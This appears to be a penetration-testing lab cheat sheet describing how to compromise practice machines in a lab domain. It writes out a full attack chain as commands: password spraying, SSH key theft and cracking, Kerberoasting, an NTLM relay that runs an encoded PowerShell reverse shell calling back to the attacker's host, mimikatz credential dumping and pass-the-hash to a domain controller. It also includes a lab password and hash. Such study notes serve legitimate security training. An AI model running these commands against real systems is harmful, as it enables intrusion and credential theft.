
# How to Approach Boxes

## 1.) Stage KALI Loot Files
1. creds.txt  - contains all found creds, usersnames, passwords
2. usernames.txt - list of found usernames - can use with nxc to password spray
3. passwords.txt - list of known passwords - can use with nxc to password spray
4. As you find them, update files  new usernames, hashes, etc
```bash
echo "newuser" >> ./loot/usernames.txt             # we found a new user, lets add it to our file 
nxc smb 192.168.50.242 -u usernames.txt -p passwords.txt  # rerun password bruteforce with new user and existing passwords
nxc smb 192.168.50.242 -u user -p "pass" --shares         # if credential found, enum shares/perms
```

##  2.) Initial Scans
- initial nmap scans
- whatweb scan with api if web server
- google serach for plugins/software version and exploit 
- searchsploit plugins/software version and exploit 
- found exploit, for file retrieval with DIR Traversal
- grabbed /etc/passwd for users with login shells
- Grabbed /home/user/.ssh/id_rsa file for user
- changed perms on id_rsa
- attempt login, pw required
- convert with ss2john to ssh.hash
- crack with john
- login via ssh

## 3.) Foothold
- Just logged into box 1 with ssh
- use linpeas/winpeas and search for vulns
- chmod a+x linpeas if nceccessary
- found GTFOBIN for sudo -l /usr/bin/git
- WP file for DB access with pass
- identified non-standard WP install location
- Sudo allowed root escalation
- found another pw hash credential in GIT commit
- share enumeration with nxc located users
- client side phishing expliot sued to get marcus creds



## GIT 
```bash
git status
git log   			    # review GIT commit comments
git show 6127...af1	    # commit number from git log
```

## Proxy stuff
```bash
# View shares &  permissions
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares

# nmap scan TCP full connect, as it won't work stealth scan over proxychains
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254

# if you find website, you must modify hosts file 
127.0.0.1 internalsrv1.beyond.com

# kerberroasting (TGS-REP hash) attempt through proxychains
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john

# also try with outputfile <filename.txt> (or -hashes <filename.txt>)
#crack and profit!
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```
## WordPress access
- We found Backup Migration plugin, pointing to local directory
- ENUM showed  SMB signing is disabled 
- We can force the bakcup, and capture the crednetial, for use in relaying to other servers
-   force an authentication request by abusing the Backup directory
-   path of the Backup Migration WordPress, plugin on INTERNALSRV1. 
-  By setting the destination path to our Kali machine, we can use impacket-ntlmrelayx to relay the incoming connection to MAILSRV1.
    - NOTE: We use ntlmrelayx when we are unpriv user and can NOT exec mimikatz (ref 16.3.4)
    - KALI will relay the AUTH to a 3rd machine, which hopefully is using/shareing the same local uesrs accounts and passwords
- authentication request is made in the context of the local Administrator account on INTERNALSRV1
- Hopefully, the same password  as the local Administrator account on MAILSRV1.

```bash
# IN WP, modify the Backup directory path to point to KALI IP with fake file //192.168.KALI/test 
# MAILSRV1 IP is target for relay
# BASE64 powershell has our KALI IP:PORT to connect back to
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
```
- we should now be system
- move miimikats to box
- priv debu, securlsa.. dump everything
- we got creds for DA becky
- use impacket-psexec for shell on DC
```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
```
